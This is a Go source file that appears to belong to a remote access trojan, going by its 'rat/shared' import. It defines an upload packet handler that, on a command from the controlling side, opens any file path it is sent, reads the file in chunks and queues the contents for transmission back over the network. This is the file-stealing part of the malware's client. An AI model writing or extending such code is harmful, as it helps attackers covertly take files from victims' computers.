package main

import (
	"fmt"
	"io"
	"os"
	"rat/shared"
)

type UploadPacket struct {
	File  string `network:"send,receive"`
	Total int64  `network:"send"`
	Final bool   `network:"send"`
	Data  []byte `network:"send"`
}

func (packet UploadPacket) Header() shared.PacketHeader {
	return shared.GetFileHeader
}

func (packet *UploadPacket) Init() {

}

func (packet UploadPacket) OnReceive() error {
	go func() {
		final := false
		local, err := os.Open(packet.File)
		defer local.Close()
		if err != nil {
			fmt.Println(err.Error())
			return
		}

		stat, err := local.Stat()
		if err != nil {
			fmt.Println(err.Error())
			return
		}

		for !final {
			data := make([]byte, shared.TransferPacketSize)

			read, err := local.Read(data)
			if err == io.EOF {
				final = true
			} else if err != nil {
				fmt.Println(err.Error())
				return
			}
			Queue <- &UploadPacket{packet.File, stat.Size(), final, data[:read]}
		}
	}()

	return nil
}
